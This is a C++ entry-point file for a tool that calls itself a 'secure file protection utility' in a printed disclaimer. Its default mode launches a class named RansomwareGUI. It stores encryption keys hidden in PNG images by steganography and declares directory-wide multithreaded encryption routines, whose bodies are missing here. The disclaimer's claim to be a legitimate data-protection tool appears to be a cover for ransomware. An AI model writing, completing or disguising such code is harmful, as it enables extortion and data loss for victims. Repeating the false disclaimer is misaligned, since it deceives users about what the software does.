#include <iostream>
#include <string>
#include <filesystem>
#include <vector>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <condition_variable>
#include "../include/file_encryptor.h"
#include "crypto/steganography.h"
#include "constants.h"
#include "gui.h"

// Define the constants declared in constants.h


// Program description and disclaimer
void showDisclaimer() {
    std::cout << "=================================================================\n";
    std::cout << "SECURE FILE PROTECTION UTILITY - VERSION 1.0\n";
    std::cout << "=================================================================\n";
    std::cout << "This is a legitimate security tool for protecting sensitive files.\n";
    std::cout << "It uses strong encryption to secure your data from unauthorized access.\n";
    std::cout << "WARNING: Always keep your decryption keys in a safe place!\n\n";
    std::cout << "By continuing, you acknowledge this is a data protection tool.\n";
    std::cout << "=================================================================\n\n";
}

// Helper function to check if a file should be skipped during protection process


// Function to secure files in a directory with balanced multithreading


// Function to decrypt files in a directory with balanced multithreading


int main(int argc, char* argv[]) {
    // Check if specific command was provided
    if (argc >= 2) {
        std::string command = argv[1];

        if (command == "generate" && argc == 4) {
            std::string privateKeyFile = argv[2];
            std::string publicKeyFile = argv[3];
            
            // Generate keys but only store in PNG images
            if (generateEncryptionKeys(privateKeyFile, publicKeyFile)) {
                std::cout << "Keys generated successfully and stored in images:\n";
                std::cout << "  Private key image: " << PRIVATE_KEY_IMAGE << "\n";
                std::cout << "  Public key image: " << PUBLIC_KEY_IMAGE << "\n";
                std::cout << "You are done.\n";
            } else {
                return 1;
            }
        } else if (command == "encrypt" && (argc == 4 || argc == 5)) {
            std::string inputFile = argv[2];
            std::string outputFile = argv[3];
            std::string keyFile = (argc == 5) ? argv[4] : "";
            
            auto result = encryptFile(inputFile, outputFile, keyFile);
            
            if (result.success) {
                std::cout << "Success: " << result.message << "\n";
                std::cout << "You are done.\n";
            } else {
                return 1;
            }
        } else if (command == "decrypt") {
            if (argc == 4 || argc == 5) {
                // Individual file decryption (existing functionality)
                std::string inputFile = argv[2];
                std::string outputFile = argv[3];
                std::string keyFile = (argc == 5) ? argv[4] : "";
                
                auto result = decryptFile(inputFile, outputFile, keyFile);
                
                if (result.success) {
                    std::cout << "Success: " << result.message << "\n";
                    std::cout << "You are done.\n";
                } else {
                    return 1;
                }
            } else if (argc == 2) {
                // Directory-wide decryption with automatic key detection from image
                std::vector<uint8_t> privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
                
                if (privateKey.empty()) {
                    std::cerr << "Error: No decryption key found in key image file.\n";
                    return 1;
                }
                
                decryptFilesInDirectory(PRIVATE_KEY_IMAGE);
            } else {
                std::cerr << "Error: Invalid arguments for decrypt command.\n";
                return 1;
            }
        } else if (command != "auto" && command != "help") {
            return 1;
        }
    }
    
    // Default behavior (no args or auto) - run GUI
    if (argc <= 1 || (argc == 2 && std::string(argv[1]) == "auto") || 
        (argc == 2 && std::string(argv[1]) == "help")) {
        
        if (argc == 2 && std::string(argv[1]) == "help") {
            return 0;
        }
        
        RansomwareGUI gui;
        gui.Run();
    }

    return 0;
}